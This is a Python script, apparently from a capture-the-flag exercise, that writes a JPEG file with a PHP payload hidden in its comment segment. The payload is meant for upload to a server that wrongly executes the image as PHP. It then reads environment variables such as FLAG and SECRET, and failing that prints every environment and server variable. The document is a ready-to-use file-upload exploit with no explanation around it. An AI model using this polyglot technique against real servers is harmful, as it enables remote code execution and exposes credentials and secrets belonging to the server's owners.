import struct

# JPEG Headers
jpeg_data = b'\xff\xd8'  # SOI marker
jpeg_data += b'\xff\xe0'  # APP0 marker
jpeg_data += struct.pack('>H', 16)  # Length
jpeg_data += b'JFIF\x00'
jpeg_data += b'\x01\x01'
jpeg_data += b'\x00' * 9

# Add PHP payload in JPEG comment segment
php_payload = b'''<?php
// Try to get flag from environment variables
$flag = getenv('FLAG');
if (!$flag) $flag = getenv('SECRET');
if (!$flag) $flag = getenv('CTF_FLAG');
if (!$flag) $flag = getenv('ENV_FLAG');

// Try $_ENV
if (!$flag && isset($_ENV['FLAG'])) $flag = $_ENV['FLAG'];
if (!$flag && isset($_ENV['SECRET'])) $flag = $_ENV['SECRET'];

// Try $_SERVER
if (!$flag && isset($_SERVER['FLAG'])) $flag = $_SERVER['FLAG'];
if (!$flag && isset($_SERVER['SECRET'])) $flag = $_SERVER['SECRET'];

// If no flag found, list all env vars
if (!$flag) {
    echo "=== Environment Variables ===\n";
    $all_vars = array_merge($_ENV, $_SERVER);
    foreach ($all_vars as $key => $value) {
        if (strpos($value, 'FLAG{') !== false) {
            echo "FOUND FLAG: $key=$value\n";
            exit;
        }
        echo "$key=$value\n";
    }
} else {
    echo "FLAG: $flag\n";
}
?>
'''

# Add comment segment with PHP
jpeg_data += b'\xff\xfe'  # COM marker
jpeg_data += struct.pack('>H', len(php_payload) + 2)  # Length
jpeg_data += php_payload

# Add minimal JPEG data
jpeg_data += b'\xff\xc0'  # SOF0 marker
jpeg_data += struct.pack('>H', 17)  # Length
jpeg_data += b'\x08'  # 8-bit precision
jpeg_data += struct.pack('>H', 1)   # Height
jpeg_data += struct.pack('>H', 1)   # Width
jpeg_data += b'\x01\x01\x00'  # Components
jpeg_data += b'\x00' * 8

jpeg_data += b'\xff\xd9'  # EOI marker

# Write the file
with open('payload_env.jpeg', 'wb') as f:
    f.write(jpeg_data)

print("Created payload_env.jpeg (size:", len(jpeg_data), "bytes)")
EOF

